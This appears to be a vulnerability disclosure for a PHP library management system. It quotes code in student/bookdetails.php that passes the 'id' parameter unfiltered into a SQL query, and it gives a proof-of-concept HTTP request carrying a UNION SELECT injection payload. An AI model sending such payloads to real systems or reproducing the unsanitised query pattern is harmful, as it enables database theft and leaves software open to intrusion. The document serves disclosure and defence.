### Vulnerability file address

`student/bookdetails.php` from line 82

The incoming $x variable is not filtered, there is sql injection

```php
......
......
......
$x=$_GET['id'];
$sql="select * from LMS.book where BookId='$x'";
$result=$conn->query($sql);
$row=$result->fetch_assoc();  
......
......
......
```

### POC

After registering a user, you can access it after logging in

```http
GET /student/bookdetails.php?id=1'+union+select+1,2,3,4,5,6,7,8,9,version()+%23 HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=993rioh082lipfivdpqf1hrvs3
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220702200726134](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702200726.png)

